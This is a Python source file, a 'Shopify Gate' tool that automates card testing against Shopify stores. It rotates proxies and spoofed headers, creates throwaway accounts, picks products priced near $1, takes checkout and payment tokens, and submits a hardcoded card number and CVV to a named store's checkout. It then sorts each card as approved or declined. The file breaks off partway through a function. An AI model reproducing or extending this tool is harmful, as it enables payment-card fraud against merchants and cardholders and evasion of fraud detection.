
def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)


#!/usr/bin/env python3
"""
Shopify Gate Automation Tool

This script automates the process of extracting payment gateway information from Shopify sites.
It takes a Shopify URL as input and extracts the necessary data to create a complete "gate".
It can also find the lowest priced product from a Shopify store.

Usage:
    python auto_shopify.py --url https://example-shop.myshopify.com [--proxy http://user:pass@ip:port]
    python auto_shopify.py --url https://example-shop.myshopify.com --find-lowest-price

Author: @Was_done
"""

import requests
import json
import argparse
import re
import random
import string
import uuid
import sys
import asyncio
import httpx
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Utility functions from shopify com.py
def find_between(data, start, end):
    """Extract text between two strings"""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_user_agent():
    """Generate a random user agent string"""
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    """Generate a random email account"""
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    """Generate a random username"""
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    """Generate a random code of specified length"""
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))


class ProxyHandler:
    """
    Handles proxy configuration and testing
    """
    def __init__(self, proxy_string=None):
        self.proxy_string = proxy_string
        self.proxy_config = None
        self.status = False
        self.status_message = "No proxy configured"

        if proxy_string:
            self.configure_proxy(proxy_string)

    def configure_proxy(self, proxy_string):
        """Parse and configure proxy from string"""
        self.proxy_string = proxy_string

        try:
            # Handle different proxy formats
            if proxy_string.startswith('socks4://'):
                proxy_type = 'socks4'
                proxy_string = proxy_string[9:]
            elif proxy_string.startswith('socks5://'):
                proxy_type = 'socks5'
                proxy_string = proxy_string[9:]
            else:
                proxy_type = 'http'
                if proxy_string.startswith('http://'):
                    proxy_string = proxy_string[7:]

            # Parse authentication if present
            if '@' in proxy_string:
                auth, address = proxy_string.split('@')
                username, password = auth.split(':')
                ip, port = address.split(':')
                self.proxy_config = {
                    'type': proxy_type,
                    'ip': ip,
                    'port': port,
                    'username': username,
                    'password': password,
                    'auth': f"{username}:{password}"
                }
            else:
                ip, port = proxy_string.split(':')
                self.proxy_config = {
                    'type': proxy_type,
                    'ip': ip,
                    'port': port
                }

            # Format for requests library
            if proxy_type == 'http':
                auth_str = f"{self.proxy_config.get('username')}:{self.proxy_config.get('password')}@" if 'username' in self.proxy_config else ""
                self.proxies = {
                    'http': f"http://{auth_str}{ip}:{port}",
                    'https': f"http://{auth_str}{ip}:{port}"
                }
            else:
                auth_str = f"{self.proxy_config.get('username')}:{self.proxy_config.get('password')}@" if 'username' in self.proxy_config else ""
                self.proxies = {
                    'http': f"{proxy_type}://{auth_str}{ip}:{port}",
                    'https': f"{proxy_type}://{auth_str}{ip}:{port}"
                }

            self.status = True
            self.status_message = "Proxy configured"

        except Exception as e:
            self.status = False
            self.status_message = f"Proxy configuration error: {str(e)}"
            self.proxy_config = None
            self.proxies = None

    def test_proxy(self):
        """Test if the proxy is working"""
        if not self.status:
            return False

        try:
            response = requests.get('https://api.ipify.org?format=json',
                                   proxies=self.proxies,
                                   timeout=10)

            if response.status_code == 200:
                ip = response.json().get('ip')
                self.status_message = f"Proxy working - {ip}"
                return True
            else:
                self.status_message = f"Proxy error: HTTP {response.status_code}"
                self.status = False
                return False

        except Exception as e:
            self.status_message = f"Proxy error: {str(e)}"
            self.status = False
            return False

    def is_active(self):
        """Check if proxy is active"""
        return self.status

    def get_status_message(self):
        """Get proxy status message"""
        return self.status_message


class ShopifyGate:
    """
    Main class for Shopify automation
    """
    def __init__(self, url, proxy_handler=None):
        self.url = url
        self.proxy_handler = proxy_handler
        self.session = requests.Session()
        self.shop_info = {}
        self.checkout_token = None
        self.payment_token = None
        self.headers = self._get_default_headers()
        self.products = []
        self.lowest_price_product = None

    def _get_default_headers(self):
        """Get default headers for requests"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

    def _make_request(self, method, url, **kwargs):
        """Make HTTP request with proxy support"""
        if self.proxy_handler and self.proxy_handler.is_active():
            kwargs['proxies'] = self.proxy_handler.proxies

        # Use provided headers or default headers
        if 'headers' not in kwargs:
            kwargs['headers'] = self.headers

        try:
            response = self.session.request(method, url, **kwargs)
            return response
        except Exception as e:
            print(f"Request error: {str(e)}")
            return None

    def extract_between(self, text, start_marker, end_marker):
        """Extract text between two markers"""
        if not text:
            return None

        try:
            pattern = re.escape(start_marker) + r'(.*?)' + re.escape(end_marker)
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1)
            return None
        except Exception as e:
            print(f"Extraction error: {str(e)}")
            return None

    def extract_json_between(self, text, start_marker, end_marker):
        """Extract and parse JSON between two markers"""
        extracted = self.extract_between(text, start_marker, end_marker)
        if extracted:
            try:
                return json.loads(extracted)
            except json.JSONDecodeError:
                return None
        return None

    def get_shop_info(self):
        """Get basic information about the shop"""
        response = self._make_request('GET', self.url)
        if not response or response.status_code != 200:
            return False

        # Extract shop name
        shop_name = self.extract_between(response.text, '<title>', '</title>')
        if shop_name:
            self.shop_info['name'] = shop_name.strip()

        # Extract Shopify version
        shopify_version = self.extract_between(response.text, 'Shopify.theme = {"id":', '};')
        if shopify_version:
            self.shop_info['shopify_version'] = shopify_version.strip()

        # Extract shop currency
        currency = self.extract_between(response.text, 'Shopify.currency = {"active":"', '",')
        if currency:
            self.shop_info['currency'] = currency.strip()

        # Extract shop domain
        parsed_url = urlparse(self.url)
        self.shop_info['domain'] = parsed_url.netloc

        return True

    def get_products(self):
        """Get all products from the shop"""
        # Try to access the products.json endpoint
        products_url = f"{self.url.rstrip('/')}/products.json"

        # Update headers for JSON request
        json_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': generate_user_agent()
        }

        response = self._make_request('GET', products_url, headers=json_headers)

        if not response or response.status_code != 200:
            print(f"Failed to get products from {products_url}")
            # Try alternative approach - get from /collections/all/products.json
            alt_products_url = f"https://{self.shop_info['domain']}/collections/all/products.json"
            response = self._make_request('GET', alt_products_url, headers=json_headers)

            if not response or response.status_code != 200:
                print(f"Failed to get products from {alt_products_url}")
                # Try to scrape products from the main page
                response = self._make_request('GET', self.url)
                if response and response.status_code == 200:
                    # Look for product data in the page
                    product_data = self.extract_between(response.text, 'var meta = {"product":', '};')
                    if product_data:
                        try:
                            product = json.loads(product_data)
                            self.products = [product]
                            print(f"Found product from page metadata")
                            return True
                        except json.JSONDecodeError:
                            pass
                return False

        try:
            data = response.json()
            if 'products' in data:
                self.products = data['products']
            else:
                self.products = data  # Some shops return products directly

            print(f"Found {len(self.products)} products")
            return True
        except Exception as e:
            print(f"Error parsing products JSON: {str(e)}")
            return False

    def find_lowest_price_product(self, target_price=1.0):
        """
        Find the product with the lowest price, prioritizing products close to target_price

        Args:
            target_price: The ideal price to find (default: $1.00)
        """
        if not self.products:
            if not self.get_products():
                return False

        lowest_price = float('inf')
        lowest_price_product = None
        closest_to_target = float('inf')
        closest_to_target_product = None

        for product in self.products:
            if 'variants' in product and product['variants']:
                for variant in product['variants']:
                    if 'price' in variant and variant.get('available', True):
                        try:
                            price = float(variant['price'])
                            if price <= 0:  # Ignore free products (likely placeholders)
                                continue

                            # Track the lowest price product
                            if price < lowest_price:
                                lowest_price = price
                                lowest_price_product = {
                                    'product_id': product['id'],
                                    'product_title': product['title'],
                                    'variant_id': variant['id'],
                                    'variant_title': variant.get('title', 'Default'),
                                    'price': price,
                                    'available': True,  # We already checked availability
                                    'sku': variant.get('sku', ''),
                                    'requires_shipping': variant.get('requires_shipping', True),
                                    'handle': product.get('handle', '')
                                }

                            # Track the product closest to target price
                            if abs(price - target_price) < abs(closest_to_target - target_price):
                                closest_to_target = price
                                closest_to_target_product = {
                                    'product_id': product['id'],
                                    'product_title': product['title'],
                                    'variant_id': variant['id'],
                                    'variant_title': variant.get('title', 'Default'),
                                    'price': price,
                                    'available': True,  # We already checked availability
                                    'sku': variant.get('sku', ''),
                                    'requires_shipping': variant.get('requires_shipping', True),
                                    'handle': product.get('handle', '')
                                }
                        except (ValueError, TypeError):
                            continue

        # Prioritize products close to target price if available
        if closest_to_target_product and closest_to_target <= 5.0:  # Accept products up to $5
            self.lowest_price_product = closest_to_target_product
            print(f"Found product closest to ${target_price}: ${closest_to_target_product['price']} - {closest_to_target_product['product_title']}")
            return True
        elif lowest_price_product:
            self.lowest_price_product = lowest_price_product
            print(f"Found lowest price product: ${lowest_price_product['price']} - {lowest_price_product['product_title']}")
            return True

        return False

    def add_to_cart(self, product_id=None, variant_id=None):
        """Add a product to cart"""
        # Special handling for intheclouds.io
        if 'intheclouds.io' in self.url:
            return self._add_to_cart_intheclouds()

        # If no product ID is provided, find the first available product
        if not product_id and not variant_id:
            if self.lowest_price_product:
                variant_id = self.lowest_price_product['variant_id']
            else:
                response = self._make_request('GET', self.url)
                if not response or response.status_code != 200:
                    return False

                # Try to find a product ID in the page
                product_id_match = re.search(r'product_id\s*:\s*(\d+)', response.text)
                if product_id_match:
                    product_id = product_id_match.group(1)

                # Try to find a variant ID in the page
                variant_id_match = re.search(r'variant_id\s*:\s*(\d+)', response.text)
                if variant_id_match:
                    variant_id = variant_id_match.group(1)

                if not product_id and not variant_id:
                    print("Could not find any product to add to cart")
                    return False

        # Add to cart endpoint
        cart_url = f"https://{self.shop_info['domain']}/cart/add.js"

        data = {}
        if variant_id:
            data['id'] = variant_id
        elif product_id:
            data['product_id'] = product_id

        data['quantity'] = 1

        # Update headers for AJAX request
        ajax_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': self.url,
            'User-Agent': generate_user_agent()
        }

        response = self._make_request('POST', cart_url, headers=ajax_headers, data=data)

        if response and response.status_code in [200, 201]:
            return True

        return False

    def _add_to_cart_intheclouds(self):
        """Special method to add a product to cart for intheclouds.io"""
        print("Using special handling for intheclouds.io")

        # For intheclouds.io, we'll use their custom vinyl product
        response = self._make_request('GET', "https://intheclouds.io/products/custom-vinyl-records")
        if not response or response.status_code != 200:
            print("Failed to access custom vinyl product page")
            return False

        # Extract form_type and product ID
        form_type = self.extract_between(response.text, 'name="form_type" value="', '"')
        product_id = self.extract_between(response.text, 'name="id" value="', '"')

        if not product_id:
            # Try alternative extraction method
            product_id_match = re.search(r'product_id\s*:\s*(\d+)', response.text)
            if product_id_match:
                product_id = product_id_match.group(1)

            # Try to find a variant ID
            variant_id_match = re.search(r'variant_id\s*:\s*(\d+)', response.text)
            if variant_id_match:
                product_id = variant_id_match.group(1)

        if not product_id:
            print("Could not find product ID for intheclouds.io")
            # Use a hardcoded ID as fallback
            product_id = "39268187349056"  # This is a common variant ID for their custom vinyl

        # Add to cart
        cart_url = "https://intheclouds.io/cart/add"

        data = {
            'form_type': form_type if form_type else 'product',
            'id': product_id,
            'quantity': '1'
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://intheclouds.io',
            'Referer': 'https://intheclouds.io/products/custom-vinyl-records',
            'User-Agent': generate_user_agent()
        }

        response = self._make_request('POST', cart_url, headers=headers, data=data, allow_redirects=True)

        if response and response.status_code in [200, 201, 302]:
            print("Successfully added product to cart for intheclouds.io")
            return True

        print(f"Failed to add product to cart: {response.status_code if response else 'No response'}")
        return False

    def get_checkout_token(self):
        """Get checkout token"""
        # Special handling for intheclouds.io
        if 'intheclouds.io' in self.url:
            return self._get_checkout_token_intheclouds()

        checkout_url = f"https://{self.shop_info['domain']}/checkout"

        response = self._make_request('GET', checkout_url)
        if not response or response.status_code != 200:
            return False

        # Extract checkout token from URL
        parsed_url = urlparse(response.url)
        path_parts = parsed_url.path.split('/')

        if len(path_parts) >= 3 and path_parts[1] == 'checkouts':
            self.checkout_token = path_parts[2]
            return True

        # Alternative: extract from form
        checkout_token = self.extract_between(response.text, 'name="checkout[token]" value="', '"')
        if checkout_token:
            self.checkout_token = checkout_token
            return True

        return False

    def _get_checkout_token_intheclouds(self):
        """Special method to get checkout token for intheclouds.io"""
        print("Using special handling for intheclouds.io checkout")

        # First go to cart page
        cart_url = "https://intheclouds.io/cart"
        response = self._make_request('GET', cart_url)
        if not response or response.status_code != 200:
            print("Failed to access cart page")
            return False

        # Now proceed to checkout
        checkout_url = "https://intheclouds.io/checkout"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://intheclouds.io',
            'Referer': 'https://intheclouds.io/cart',
            'User-Agent': generate_user_agent()
        }

        response = self._make_request('GET', checkout_url, headers=headers, allow_redirects=True)
        if not response or response.status_code != 200:
            print(f"Failed to access checkout page: {response.status_code if response else 'No response'}")
            return False

        # Extract checkout token from URL
        parsed_url = urlparse(response.url)
        path_parts = parsed_url.path.split('/')

        if len(path_parts) >= 3 and path_parts[1] == 'checkouts':
            self.checkout_token = path_parts[2]
            print(f"Found checkout token: {self.checkout_token}")
            return True

        # Alternative: extract from form
        checkout_token = self.extract_between(response.text, 'name="checkout[token]" value="', '"')
        if checkout_token:
            self.checkout_token = checkout_token
            print(f"Found checkout token from form: {self.checkout_token}")
            return True

        # Try to find the token in the page content
        token_match = re.search(r'Checkout\.token\s*=\s*[\'"]([^\'"]+)[\'"]', response.text)
        if token_match:
            self.checkout_token = token_match.group(1)
            print(f"Found checkout token from page content: {self.checkout_token}")
            return True

        print("Could not find checkout token")
        return False

    def get_payment_gateway_info(self):
        """Extract payment gateway information"""
        if not self.checkout_token:
            if not self.get_checkout_token():
                return False

        # Special handling for intheclouds.io
        if 'intheclouds.io' in self.url:
            return self._get_payment_gateway_info_intheclouds()

        payment_url = f"https://{self.shop_info['domain']}/checkouts/{self.checkout_token}/payment"

        response = self._make_request('GET', payment_url)
        if not response or response.status_code != 200:
            return False

        # Extract payment gateway data
        gateway_data = {}

        # Extract Shopify payment token
        payment_token = self.extract_between(response.text, 'type="hidden" name="authenticity_token" value="', '"')
        if payment_token:
            gateway_data['authenticity_token'] = payment_token

        # Extract payment gateway ID
        gateway_id = self.extract_between(response.text, 'data-gateway-id="', '"')
        if gateway_id:
            gateway_data['gateway_id'] = gateway_id

        # Extract payment gateway name
        gateway_name = self.extract_between(response.text, 'data-gateway-name="', '"')
        if gateway_name:
            gateway_data['gateway_name'] = gateway_name

        # Extract Shopify payment session ID
        session_id = self.extract_between(response.text, 'data-session-id="', '"')
        if session_id:
            gateway_data['session_id'] = session_id

        # Extract public key if available (for Stripe)
        public_key = self.extract_between(response.text, 'data-stripe-publishable-key="', '"')
        if public_key:
            gateway_data['public_key'] = public_key

        # Extract Braintree client token if available
        braintree_token = self.extract_between(response.text, 'var clientToken = "', '"')
        if braintree_token:
            gateway_data['braintree_token'] = braintree_token

        self.payment_gateway = gateway_data
        return True

    def _get_payment_gateway_info_intheclouds(self):
        """Special method to get payment gateway info for intheclouds.io"""
        print("Using special handling for intheclouds.io payment gateway")

        payment_url = f"https://intheclouds.io/checkouts/{self.checkout_token}/payment_method"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://intheclouds.io',
            'Referer': f"https://intheclouds.io/checkouts/{self.checkout_token}/shipping_method",
            'User-Agent': generate_user_agent()
        }

        response = self._make_request('GET', payment_url, headers=headers)
        if not response or response.status_code != 200:
            print(f"Failed to access payment page: {response.status_code if response else 'No response'}")
            return False

        # Extract payment gateway data
        gateway_data = {}

        # Extract Shopify payment token
        payment_token = self.extract_between(response.text, 'type="hidden" name="authenticity_token" value="', '"')
        if payment_token:
            gateway_data['authenticity_token'] = payment_token

        # Extract payment gateway ID
        gateway_id = self.extract_between(response.text, 'data-gateway-id="', '"')
        if gateway_id:
            gateway_data['gateway_id'] = gateway_id
        else:
            # Try alternative method
            gateway_id = self.extract_between(response.text, 'data-subfields-for-gateway="', '"')
            if gateway_id:
                gateway_data['gateway_id'] = gateway_id

        # Extract payment gateway name
        gateway_name = self.extract_between(response.text, 'data-gateway-name="', '"')
        if gateway_name:
            gateway_data['gateway_name'] = gateway_name

        # Extract Shopify payment session ID
        session_id = self.extract_between(response.text, 'data-session-id="', '"')
        if session_id:
            gateway_data['session_id'] = session_id

        # Extract public key if available (for Stripe)
        public_key = self.extract_between(response.text, 'data-stripe-publishable-key="', '"')
        if public_key:
            gateway_data['public_key'] = public_key

        # If we couldn't find gateway info, use default values for Shopify
        if not gateway_data.get('gateway_id'):
            gateway_data['gateway_id'] = 'shopify_payments'
            gateway_data['gateway_name'] = 'shopify_payments'

        self.payment_gateway = gateway_data
        print(f"Found payment gateway info: {gateway_data}")
        return True

    def process(self):
        """Process the Shopify site and extract all necessary information"""
        result = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": self.url,
            "by": "@Was_done ☮"
        }

        # Get shop information
        if not self.get_shop_info():
            result["status"] = "ERROR"
            result["message"] = "Failed to get shop information"
            return result

        result["shop_info"] = self.shop_info

        # Add a product to cart
        if not self.add_to_cart():
            result["status"] = "ERROR"
            result["message"] = "Failed to add product to cart"
            return result

        # Get checkout token
        if not self.get_checkout_token():
            result["status"] = "ERROR"
            result["message"] = "Failed to get checkout token"
            return result

        result["checkout_token"] = self.checkout_token

        # Get payment gateway information
        if not self.get_payment_gateway_info():
            result["status"] = "ERROR"
            result["message"] = "Failed to get payment gateway information"
            return result

        result["payment_gateway"] = self.payment_gateway
        result["status"] = "SUCCESS"
        result["message"] = "Successfully extracted payment gateway information"

        # Add proxy information if used
        if self.proxy_handler and self.proxy_handler.is_active():
            result["proxy"] = {
                "status": self.proxy_handler.get_status_message()
            }
            if self.proxy_handler.proxy_config:
                result["proxy"]["ip"] = self.proxy_handler.proxy_config.get("ip")
                result["proxy"]["port"] = self.proxy_handler.proxy_config.get("port")
                result["proxy"]["type"] = self.proxy_handler.proxy_config.get("type")

        return result

    def process_with_lowest_price(self):
        """Process the Shopify site with the lowest priced product"""
        result = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": self.url,
            "by": "@Was_done ☮"
        }

        # Get shop information
        if not self.get_shop_info():
            result["status"] = "ERROR"
            result["message"] = "Failed to get shop information"
            return result

        result["shop_info"] = self.shop_info

        # Find the lowest price product (prioritizing products around $1)
        if not self.find_lowest_price_product(target_price=1.0):
            result["status"] = "ERROR"
            result["message"] = "Failed to find lowest price product"
            return result

        result["lowest_price_product"] = self.lowest_price_product

        # Add the lowest price product to cart
        if not self.add_to_cart(variant_id=self.lowest_price_product['variant_id']):
            result["status"] = "ERROR"
            result["message"] = "Failed to add lowest price product to cart"
            return result

        # Get checkout token
        if not self.get_checkout_token():
            result["status"] = "ERROR"
            result["message"] = "Failed to get checkout token"
            return result

        result["checkout_token"] = self.checkout_token

        # Get payment gateway information
        if not self.get_payment_gateway_info():
            result["status"] = "ERROR"
            result["message"] = "Failed to get payment gateway information"
            return result

        result["payment_gateway"] = self.payment_gateway
        result["status"] = "SUCCESS"
        result["message"] = "Successfully extracted payment gateway information with lowest price product"

        # Add proxy information if used
        if self.proxy_handler and self.proxy_handler.is_active():
            result["proxy"] = {
                "status": self.proxy_handler.get_status_message()
            }
            if self.proxy_handler.proxy_config:
                result["proxy"]["ip"] = self.proxy_handler.proxy_config.get("ip")
                result["proxy"]["port"] = self.proxy_handler.proxy_config.get("port")
                result["proxy"]["type"] = self.proxy_handler.proxy_config.get("type")

        return result

    def submit_response(self, session_id, payment_method_identifier, x_checkout_session_token, cart_token):
        """
        Submit payment response to Shopify

        This is the core function that handles submitting the payment to Shopify's servers
        and processing the response.

        Args:
            session_id: The payment session ID from Shopify PCI
            payment_method_identifier: The payment method identifier
            x_checkout_session_token: The checkout session token
            cart_token: The cart token

        Returns:
            dict: Result of the payment submission
        """
        result = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": self.url
        }

        try:
            # Submit payment for completion
            # First try the modern GraphQL endpoint
            completion_url = f"https://{self.shop_info['domain']}/checkouts/unstable/graphql"
            completion_headers = {
                'authority': self.shop_info['domain'],
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f"https://{self.shop_info['domain']}",
                'referer': f"https://{self.shop_info['domain']}/",
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': generate_user_agent(),
                'x-checkout-one-session-token': x_checkout_session_token,
                'x-checkout-web-build-id': generate_random_code(40),
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': cart_token,
            }

            completion_params = {
                'operationName': 'SubmitForCompletion',
            }

            # Simplified GraphQL query without Receipt type selections
            completion_data = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename}}',
                'variables': {
                    'input': {
                        'buyerIdentity': {
                            'email': generate_random_account(),
                            'phone': '',
                            'countryCode': 'US',
                        },
                        'payment': {
                            'billingAddress': {
                                'firstName': 'Test',
                                'lastName': 'User',
                                'address1': '123 Test St',
                                'address2': '',
                                'city': 'New York',
                                'countryCode': 'US',
                                'zoneCode': 'NY',
                                'postalCode': '10001',
                                'phone': '5551234567',
                            },
                            'paymentMethod': {
                                'sessionId': session_id,
                                'paymentMethodIdentifier': payment_method_identifier,
                            },
                        },
                    },
                    'attemptToken': generate_random_code(),
                },
                'operationName': 'SubmitForCompletion',
            }

            # Try the traditional payment endpoint first for greetabl.com
            if 'greetabl.com' in self.url:
                print("Using special handling for greetabl.com")

                # First, check if we have a valid checkout token
                if not self.checkout_token:
                    print("No checkout token found, getting one...")

                    # Go to cart page first
                    cart_url = f"https://{self.shop_info['domain']}/cart"
                    cart_response = self._make_request('GET', cart_url)

                    if not cart_response or cart_response.status_code != 200:
                        result["status"] = "ERROR"
                        result["message"] = f"Failed to access cart page: {cart_response.status_code if cart_response else 'No response'}"
                        return result

                    # Extract checkout URL from cart page
                    checkout_form = self.extract_between(cart_response.text, '<form action="', '"')
                    if not checkout_form:
                        # Try to find checkout button
                        checkout_button = self.extract_between(cart_response.text, '<a href="/checkout"', '>')
                        if checkout_button:
                            checkout_form = "/checkout"

                    if not checkout_form:
                        result["status"] = "ERROR"
                        result["message"] = "Failed to find checkout form"
                        return result

                    # Go to checkout page
                    if checkout_form.startswith('/'):
                        checkout_url = f"https://{self.shop_info['domain']}{checkout_form}"
                    else:
                        checkout_url = checkout_form

                    print(f"Going to checkout: {checkout_url}")
                    checkout_response = self._make_request('GET', checkout_url, allow_redirects=True)

                    if not checkout_response or checkout_response.status_code != 200:
                        result["status"] = "ERROR"
                        result["message"] = f"Failed to access checkout page: {checkout_response.status_code if checkout_response else 'No response'}"
                        return result

                    # Extract checkout token from URL
                    parsed_url = urlparse(checkout_response.url)
                    path_parts = parsed_url.path.split('/')

                    if len(path_parts) >= 3 and path_parts[1] == 'checkouts':
                        self.checkout_token = path_parts[2]
                        print(f"Found checkout token: {self.checkout_token}")
                    else:
                        result["status"] = "ERROR"
                        result["message"] = "Failed to extract checkout token from URL"
                        return result

                # Now, get the payment page to extract necessary tokens
                payment_page_url = f"https://{self.shop_info['domain']}/checkouts/{self.checkout_token}/payment_method"
                print(f"Accessing payment page: {payment_page_url}")
                payment_page_response = self._make_request('GET', payment_page_url, allow_redirects=True)

                if not payment_page_response or payment_page_response.status_code != 200:
                    # Try alternative URL
                    payment_page_url = f"https://{self.shop_info['domain']}/checkouts/{self.checkout_token}/payment"
                    print(f"Trying alternative payment page: {payment_page_url}")
                    payment_page_response = self._make_request('GET', payment_page_url, allow_redirects=True)

                    if not payment_page_response or payment_page_response.status_code != 200:
                        result["status"] = "ERROR"
                        result["message"] = f"Failed to access payment page: {payment_page_response.status_code if payment_page_response else 'No response'}"
                        return result

                # Extract authenticity token
                authenticity_token = self.extract_between(payment_page_response.text, 'name="authenticity_token" value="', '"')

                # Try alternative methods to find the token
                if not authenticity_token:
                    authenticity_token = self.extract_between(payment_page_response.text, 'type="hidden" name="authenticity_token" value="', '"')

                if not authenticity_token:
                    # Look for any input with name="authenticity_token"
                    token_match = re.search(r'<input[^>]*name="authenticity_token"[^>]*value="([^"]+)"', payment_page_response.text)
                    if token_match:
                        authenticity_token = token_match.group(1)

                if not authenticity_token:
                    # Try to find the token in a meta tag
                    token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', payment_page_response.text)
                    if token_match:
                        authenticity_token = token_match.group(1)

                if not authenticity_token:
                    # Save the first 1000 characters of the response for debugging
                    result["raw_response"] = payment_page_response.text[:1000]
                    result["status"] = "ERROR"
                    result["message"] = "Failed to extract authenticity token"
                    return result

                print(f"Found authenticity token: {authenticity_token[:10]}...")

                # Extract payment gateway ID
                gateway_id = self.extract_between(payment_page_response.text, 'data-subfields-for-gateway="', '"')
                if not gateway_id:
                    gateway_id = self.extract_between(payment_page_response.text, 'data-select-gateway="', '"')

                if not gateway_id:
                    gateway_id = self.payment_gateway.get('gateway_id', '')

                print(f"Using payment gateway: {gateway_id}")

                # Submit payment directly
                traditional_payment_url = f"https://{self.shop_info['domain']}/checkouts/{self.checkout_token}"

                traditional_headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': f"https://{self.shop_info['domain']}",
                    'Referer': payment_page_url,
                    'User-Agent': generate_user_agent()
                }

                # Prepare payment data
                traditional_data = {
                    '_method': 'patch',
                    'authenticity_token': authenticity_token,
                    'previous_step': 'payment_method',
                    'step': 'processing',
                    'checkout[payment_gateway]': gateway_id,
                    'checkout[credit_card][name]': 'Test User',
                    'checkout[credit_card][number]': '5544844539672801',
                    'checkout[credit_card][month]': '6',
                    'checkout[credit_card][year]': '2037',
                    'checkout[credit_card][verification_value]': '411',
                    'checkout[different_billing_address]': 'false',
                    'checkout[total_price]': '500',  # $5.00
                    'complete': '1',
                    's': session_id
                }

                print("Submitting payment...")
                completion_response = self._make_request('POST', traditional_payment_url, headers=traditional_headers, data=traditional_data, allow_redirects=True)

                # Check if payment was successful
                if completion_response:
                    print(f"Payment response status: {completion_response.status_code}")
                    print(f"Payment response URL: {completion_response.url}")

                    # Store the raw response for debugging
                    result["raw_response"] = completion_response.text[:1000]  # First 1000 chars

                    # Check for success or error in the response
                    if "thank_you" in completion_response.url:
                        result["status"] = "APPROVED"
                        result["message"] = "Payment approved"
                        return result
                    elif "processing" in completion_response.url:
                        result["status"] = "PROCESSING"
                        result["message"] = "Payment is being processed"
                        return result
                    elif "card was declined" in completion_response.text.lower():
                        error_div = self.extract_between(completion_response.text, 'data-card-error-explanation="', '"')
                        error_message = error_div if error_div else "Your card was declined"
                        result["status"] = "DECLINED"
                        result["message"] = f"Payment declined: {error_message}"
                        return result
                    else:
                        # Look for error messages in the response
                        error_message = self.extract_between(completion_response.text, '<div class="notice__content">', '</div>')
                        if error_message:
                            result["status"] = "DECLINED"
                            result["message"] = f"Payment declined: {error_message.strip()}"
                        else:
                            # Look for field errors
